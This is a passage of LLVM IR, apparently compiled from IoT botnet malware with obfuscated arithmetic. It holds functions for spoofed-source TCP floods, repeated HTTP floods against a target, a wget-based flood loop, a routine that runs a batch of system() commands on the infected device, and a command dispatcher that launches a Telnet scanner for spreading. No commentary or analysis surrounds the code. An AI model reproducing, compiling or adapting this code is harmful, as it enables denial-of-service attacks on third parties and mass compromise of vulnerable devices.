  %579 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %580 = call i64 @sendto(i32 %578, i8* %87, i64 %84, i32 0, %struct.sockaddr* %579, i32 16)
  %581 = load i32, i32* %19, align 4
  %582 = call i32 @getRandomIP(i32 %581)
  %583 = call i32 @htonl(i32 %582) #10
  %584 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %585 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %584, i32 0, i32 8
  store i32 %583, i32* %585, align 4
  %586 = call i32 @rand_cmwc()
  %587 = trunc i32 %586 to i16
  %588 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %589 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %588, i32 0, i32 3
  store i16 %587, i16* %589, align 4
  %590 = call i32 @rand_cmwc()
  %591 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %592 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %591, i32 0, i32 0
  %593 = bitcast %union.anon* %592 to %struct.anon.0*
  %594 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %593, i32 0, i32 2
  store i32 %590, i32* %594, align 4
  %595 = call i32 @rand_cmwc()
  %596 = trunc i32 %595 to i16
  %597 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %598 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %597, i32 0, i32 0
  %599 = bitcast %union.anon* %598 to %struct.anon.0*
  %600 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %599, i32 0, i32 0
  store i16 %596, i16* %600, align 4
  %601 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %602 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %601, i32 0, i32 0
  %603 = bitcast %union.anon* %602 to %struct.anon.0*
  %604 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %603, i32 0, i32 6
  store i16 0, i16* %604, align 4
  %605 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %606 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %607 = call zeroext i16 @tcpcsum(%struct.iphdr* %605, %struct.tcphdr* %606)
  %608 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %609 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %608, i32 0, i32 0
  %610 = bitcast %union.anon* %609 to %struct.anon.0*
  %611 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %610, i32 0, i32 6
  store i16 %607, i16* %611, align 4
  %612 = bitcast i8* %87 to i16*
  %613 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %614 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %613, i32 0, i32 2
  %615 = load i16, i16* %614, align 2
  %616 = zext i16 %615 to i32
  %617 = call zeroext i16 @csum(i16* %612, i32 %616)
  %618 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %619 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %618, i32 0, i32 7
  store i16 %617, i16* %619, align 2
  %620 = load i32, i32* %25, align 4
  %621 = load i32, i32* %15, align 4
  %622 = icmp eq i32 %620, %621
  br i1 %622, label %623, label %630

; <label>:623:                                    ; preds = %577
  %624 = call i64 @time(i64* null) #5
  %625 = load i32, i32* %24, align 4
  %626 = sext i32 %625 to i64
  %627 = icmp sgt i64 %624, %626
  br i1 %627, label %628, label %629

; <label>:628:                                    ; preds = %623
  br label %636

; <label>:629:                                    ; preds = %623
  store i32 0, i32* %25, align 4
  br label %576

; <label>:630:                                    ; preds = %577
  %631 = load i32, i32* %25, align 4
  %632 = add i32 %631, 285917700
  %633 = add i32 %632, 1
  %634 = sub i32 %633, 285917700
  %635 = add i32 %631, 1
  store i32 %634, i32* %25, align 4
  br label %576

; <label>:636:                                    ; preds = %628
  %637 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %637)
  br label %638

; <label>:638:                                    ; preds = %636, %57, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #5
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #10
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #5
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #5
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add i64 %19, 4406809073423885845
  %23 = add i64 %22, %21
  %24 = sub i64 %23, 4406809073423885845
  %25 = add nsw i64 %19, %21
  %26 = trunc i64 %24 to i32
  store i32 %26, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %27

; <label>:27:                                     ; preds = %70, %6
  %28 = load i32, i32* %14, align 4
  %29 = load i32, i32* %12, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %77

; <label>:31:                                     ; preds = %27
  %32 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %33 = load i8*, i8** %7, align 8
  %34 = load i8*, i8** %10, align 8
  %35 = load i8*, i8** %8, align 8
  %36 = call i32 @rand() #5
  %37 = srem i32 %36, 59
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [59 x i8*], [59 x i8*]* @uagents, i64 0, i64 %38
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 (i8*, i8*, ...) @sprintf(i8* %32, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.163, i32 0, i32 0), i8* %33, i8* %34, i8* %35, i8* %40) #5
  %42 = call i32 @fork() #5
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %69

; <label>:44:                                     ; preds = %31
  br label %45

; <label>:45:                                     ; preds = %67, %44
  %46 = load i32, i32* %15, align 4
  %47 = sext i32 %46 to i64
  %48 = call i64 @time(i64* null) #5
  %49 = icmp sgt i64 %47, %48
  br i1 %49, label %50, label %68

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %8, align 8
  %52 = load i16, i16* %9, align 2
  %53 = call i32 @socket_connect(i8* %51, i16 zeroext %52)
  store i32 %53, i32* %13, align 4
  %54 = load i32, i32* %13, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %67

; <label>:56:                                     ; preds = %50
  %57 = load i32, i32* %13, align 4
  %58 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %60 = call i64 @strlen(i8* %59) #9
  %61 = call i64 @write(i32 %57, i8* %58, i64 %60)
  %62 = load i32, i32* %13, align 4
  %63 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %64 = call i64 @read(i32 %62, i8* %63, i64 1)
  %65 = load i32, i32* %13, align 4
  %66 = call i32 @close(i32 %65)
  br label %67

; <label>:67:                                     ; preds = %56, %50
  br label %45

; <label>:68:                                     ; preds = %45
  call void @exit(i32 0) #12
  unreachable

; <label>:69:                                     ; preds = %31
  br label %70

; <label>:70:                                     ; preds = %69
  %71 = load i32, i32* %14, align 4
  %72 = sub i32 0, %71
  %73 = sub i32 0, 1
  %74 = add i32 %72, %73
  %75 = sub i32 0, %74
  %76 = add nsw i32 %71, 1
  store i32 %75, i32* %14, align 4
  br label %27

; <label>:77:                                     ; preds = %27
  ret void
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @SendHTTPHEX(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  %19 = alloca [2048 x i8], align 16
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %20 = call i64 @time(i64* null) #5
  %21 = load i32, i32* %11, align 4
  %22 = sext i32 %21 to i64
  %23 = add i64 %20, 1003638191121326939
  %24 = add i64 %23, %22
  %25 = sub i64 %24, 1003638191121326939
  %26 = add nsw i64 %20, %22
  %27 = trunc i64 %25 to i32
  store i32 %27, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %28 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %29 = call i32 (i8*, i8*, ...) @sprintf(i8* %28, i8* getelementptr inbounds ([285 x i8], [285 x i8]* @.str.164, i32 0, i32 0)) #5
  store i32 0, i32* %14, align 4
  br label %30

; <label>:30:                                     ; preds = %73, %6
  %31 = load i32, i32* %14, align 4
  %32 = load i32, i32* %12, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %80

; <label>:34:                                     ; preds = %30
  %35 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %36 = load i8*, i8** %7, align 8
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %38 = load i8*, i8** %8, align 8
  %39 = call i32 @rand() #5
  %40 = srem i32 %39, 59
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [59 x i8*], [59 x i8*]* @uagents, i64 0, i64 %41
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 (i8*, i8*, ...) @sprintf(i8* %35, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.163, i32 0, i32 0), i8* %36, i8* %37, i8* %38, i8* %43) #5
  %45 = call i32 @fork() #5
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %47, label %72

; <label>:47:                                     ; preds = %34
  br label %48

; <label>:48:                                     ; preds = %70, %47
  %49 = load i32, i32* %15, align 4
  %50 = sext i32 %49 to i64
  %51 = call i64 @time(i64* null) #5
  %52 = icmp sgt i64 %50, %51
  br i1 %52, label %53, label %71

; <label>:53:                                     ; preds = %48
  %54 = load i8*, i8** %8, align 8
  %55 = load i16, i16* %9, align 2
  %56 = call i32 @socket_connect(i8* %54, i16 zeroext %55)
  store i32 %56, i32* %13, align 4
  %57 = load i32, i32* %13, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %59, label %70

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %13, align 4
  %61 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %62 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %63 = call i64 @strlen(i8* %62) #9
  %64 = call i64 @write(i32 %60, i8* %61, i64 %63)
  %65 = load i32, i32* %13, align 4
  %66 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %67 = call i64 @read(i32 %65, i8* %66, i64 1)
  %68 = load i32, i32* %13, align 4
  %69 = call i32 @close(i32 %68)
  br label %70

; <label>:70:                                     ; preds = %59, %53
  br label %48

; <label>:71:                                     ; preds = %48
  call void @exit(i32 0) #12
  unreachable

; <label>:72:                                     ; preds = %34
  br label %73

; <label>:73:                                     ; preds = %72
  %74 = load i32, i32* %14, align 4
  %75 = sub i32 0, %74
  %76 = sub i32 0, 1
  %77 = add i32 %75, %76
  %78 = sub i32 0, %77
  %79 = add nsw i32 %74, 1
  store i32 %78, i32* %14, align 4
  br label %30

; <label>:80:                                     ; preds = %30
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTPTXT(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  %19 = alloca [2048 x i8], align 16
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %20 = call i64 @time(i64* null) #5
  %21 = load i32, i32* %11, align 4
  %22 = sext i32 %21 to i64
  %23 = sub i64 0, %22
  %24 = sub i64 %20, %23
  %25 = add nsw i64 %20, %22
  %26 = trunc i64 %24 to i32
  store i32 %26, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %27 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %28 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.165, i32 0, i32 0)) #5
  store i32 0, i32* %14, align 4
  br label %29

; <label>:29:                                     ; preds = %72, %6
  %30 = load i32, i32* %14, align 4
  %31 = load i32, i32* %12, align 4
  %32 = icmp slt i32 %30, %31
  br i1 %32, label %33, label %78

; <label>:33:                                     ; preds = %29
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %35 = load i8*, i8** %7, align 8
  %36 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %37 = load i8*, i8** %8, align 8
  %38 = call i32 @rand() #5
  %39 = srem i32 %38, 59
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds [59 x i8*], [59 x i8*]* @uagents, i64 0, i64 %40
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 (i8*, i8*, ...) @sprintf(i8* %34, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.163, i32 0, i32 0), i8* %35, i8* %36, i8* %37, i8* %42) #5
  %44 = call i32 @fork() #5
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %46, label %71

; <label>:46:                                     ; preds = %33
  br label %47

; <label>:47:                                     ; preds = %69, %46
  %48 = load i32, i32* %15, align 4
  %49 = sext i32 %48 to i64
  %50 = call i64 @time(i64* null) #5
  %51 = icmp sgt i64 %49, %50
  br i1 %51, label %52, label %70

; <label>:52:                                     ; preds = %47
  %53 = load i8*, i8** %8, align 8
  %54 = load i16, i16* %9, align 2
  %55 = call i32 @socket_connect(i8* %53, i16 zeroext %54)
  store i32 %55, i32* %13, align 4
  %56 = load i32, i32* %13, align 4
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %58, label %69

; <label>:58:                                     ; preds = %52
  %59 = load i32, i32* %13, align 4
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %61 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %62 = call i64 @strlen(i8* %61) #9
  %63 = call i64 @write(i32 %59, i8* %60, i64 %62)
  %64 = load i32, i32* %13, align 4
  %65 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %66 = call i64 @read(i32 %64, i8* %65, i64 1)
  %67 = load i32, i32* %13, align 4
  %68 = call i32 @close(i32 %67)
  br label %69

; <label>:69:                                     ; preds = %58, %52
  br label %47

; <label>:70:                                     ; preds = %47
  call void @exit(i32 0) #12
  unreachable

; <label>:71:                                     ; preds = %33
  br label %72

; <label>:72:                                     ; preds = %71
  %73 = load i32, i32* %14, align 4
  %74 = add i32 %73, 1244014884
  %75 = add i32 %74, 1
  %76 = sub i32 %75, 1244014884
  %77 = add nsw i32 %73, 1
  store i32 %76, i32* %14, align 4
  br label %29

; <label>:78:                                     ; preds = %29
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @CleanDevice() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.166, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.167, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.168, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.169, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.170, i32 0, i32 0))
  %6 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.171, i32 0, i32 0))
  %7 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.172, i32 0, i32 0))
  %8 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.173, i32 0, i32 0))
  %9 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.174, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.175, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.176, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.177, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.178, i32 0, i32 0))
  ret void
}

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @SendWGET(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca [80 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %8 = call i64 @time(i64* null) #5
  %9 = load i32, i32* %4, align 4
  %10 = sext i32 %9 to i64
  %11 = sub i64 %8, -6066808797110198622
  %12 = add i64 %11, %10
  %13 = add i64 %12, -6066808797110198622
  %14 = add nsw i64 %8, %10
  %15 = trunc i64 %13 to i32
  store i32 %15, i32* %5, align 4
  %16 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %17 = call i32 (i8*, i8*, ...) @sprintf(i8* %16, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.179, i32 0, i32 0)) #5
  %18 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %19 = load i8*, i8** %3, align 8
  %20 = call i8* @strcat(i8* %18, i8* %19) #5
  %21 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %22 = call %struct._IO_FILE* @popen(i8* %21, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.180, i32 0, i32 0))
  store %struct._IO_FILE* %22, %struct._IO_FILE** %6, align 8
  br label %23

; <label>:23:                                     ; preds = %28, %2
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = call i64 @time(i64* null) #5
  %27 = icmp sgt i64 %25, %26
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %23
  %29 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %30 = call i32 @system(i8* %29)
  br label %23

; <label>:31:                                     ; preds = %23
  ret void
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #3

declare %struct._IO_FILE* @popen(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %37 = load i8**, i8*** %4, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @strcmp(i8* %39, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.181, i32 0, i32 0)) #9
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %43, label %42

; <label>:42:                                     ; preds = %2
  br label %717

; <label>:43:                                     ; preds = %2
  %44 = load i8**, i8*** %4, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 0
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @strcmp(i8* %46, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.182, i32 0, i32 0)) #9
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %162, label %49

; <label>:49:                                     ; preds = %43
  %50 = load i8**, i8*** %4, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 1
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 @strcmp(i8* %52, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.183, i32 0, i32 0)) #9
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %125, label %55

; <label>:55:                                     ; preds = %49
  %56 = call i32 @fork() #5
  store i32 %56, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %57 = call i64 @sysconf(i32 84) #5
  %58 = trunc i64 %57 to i32
  store i32 %58, i32* %7, align 4
  store i32 999999, i32* %8, align 4
  %59 = load i32, i32* %7, align 4
  %60 = icmp eq i32 %59, 1
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %55
  store i32 500, i32* %8, align 4
  br label %62

; <label>:62:                                     ; preds = %61, %55
  %63 = load i32, i32* %7, align 4
  %64 = icmp sge i32 %63, 2
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  store i32 1000, i32* %8, align 4
  br label %66

; <label>:66:                                     ; preds = %65, %62
  %67 = load i32, i32* %5, align 4
  %68 = icmp ugt i32 %67, 0
  br i1 %68, label %69, label %71

; <label>:69:                                     ; preds = %66
  %70 = load i32, i32* %5, align 4
  store i32 %70, i32* @scanPid, align 4
  br label %717

; <label>:71:                                     ; preds = %66
  %72 = load i32, i32* %5, align 4
  %73 = icmp eq i32 %72, -1
  br i1 %73, label %74, label %75

; <label>:74:                                     ; preds = %71
  br label %717

; <label>:75:                                     ; preds = %71
  br label %76

; <label>:76:                                     ; preds = %75
  store i32 0, i32* %6, align 4
  br label %77

; <label>:77:                                     ; preds = %118, %76
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %7, align 4
  %80 = icmp slt i32 %78, %79
  br i1 %80, label %81, label %124

; <label>:81:                                     ; preds = %77
  %82 = call i64 @time(i64* null) #5
  %83 = call i32 @getpid() #5
  %84 = sext i32 %83 to i64
  %85 = xor i64 %82, -1
  %86 = and i64 -5095945615749381401, %85
  %87 = xor i64 -5095945615749381401, -1
  %88 = and i64 %82, %87
  %89 = xor i64 %84, -1
  %90 = and i64 %89, -5095945615749381401
  %91 = and i64 %84, %87
  %92 = or i64 %86, %88
  %93 = or i64 %90, %91
  %94 = xor i64 %92, %93
  %95 = xor i64 %82, %84
  %96 = call i32 @getppid() #5
  %97 = sext i32 %96 to i64
  %98 = sub i64 0, %97
  %99 = sub i64 %94, %98
  %100 = add nsw i64 %94, %97
  %101 = trunc i64 %99 to i32
  call void @srand(i32 %101) #5
  %102 = call i64 @time(i64* null) #5
  %103 = call i32 @getpid() #5
  %104 = sext i32 %103 to i64
  %105 = xor i64 %102, -1
  %106 = and i64 -1585348498094799958, %105
  %107 = xor i64 -1585348498094799958, -1
  %108 = and i64 %102, %107
  %109 = xor i64 %104, -1
  %110 = and i64 %109, -1585348498094799958
  %111 = and i64 %104, %107
  %112 = or i64 %106, %108
  %113 = or i64 %110, %111
  %114 = xor i64 %112, %113
  %115 = xor i64 %102, %104
  %116 = trunc i64 %114 to i32
  call void @init_rand(i32 %116)
  %117 = load i32, i32* %8, align 4
  call void @TelnetScanner(i32 100, i32 %117)
  call void @_exit(i32 0) #11
  unreachable
                                                  ; No predecessors!
  %119 = load i32, i32* %6, align 4
  %120 = add i32 %119, -2099346134
  %121 = add i32 %120, 1
  %122 = sub i32 %121, -2099346134
  %123 = add nsw i32 %119, 1
  store i32 %122, i32* %6, align 4
  br label %77

; <label>:124:                                    ; preds = %77
  br label %125

; <label>:125:                                    ; preds = %124, %49
  %126 = load i8**, i8*** %4, align 8
  %127 = getelementptr inbounds i8*, i8** %126, i64 1
  %128 = load i8*, i8** %127, align 8
  %129 = call i32 @strcmp(i8* %128, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.184, i32 0, i32 0)) #9
  %130 = icmp ne i32 %129, 0
  br i1 %130, label %138, label %131

; <label>:131:                                    ; preds = %125
  %132 = load i32, i32* @scanPid, align 4
  %133 = icmp eq i32 %132, 0
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %131
  br label %717

; <label>:135:                                    ; preds = %131
  %136 = load i32, i32* @scanPid, align 4
  %137 = call i32 @kill(i32 %136, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  br label %138

; <label>:138:                                    ; preds = %135, %125
  %139 = load i8**, i8*** %4, align 8
  %140 = getelementptr inbounds i8*, i8** %139, i64 1
  %141 = load i8*, i8** %140, align 8
  %142 = call i32 @strcmp(i8* %141, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.185, i32 0, i32 0)) #9
  %143 = icmp ne i32 %142, 0
  br i1 %143, label %161, label %144

; <label>:144:                                    ; preds = %138
  %145 = load i8**, i8*** %4, align 8
  %146 = getelementptr inbounds i8*, i8** %145, i64 1
  %147 = load i8*, i8** %146, align 8
  %148 = call i32 @atoi(i8* %147) #9
  store i32 %148, i32* %9, align 4
  %149 = load i8**, i8*** %4, align 8
  %150 = getelementptr inbounds i8*, i8** %149, i64 2
  %151 = load i8*, i8** %150, align 8
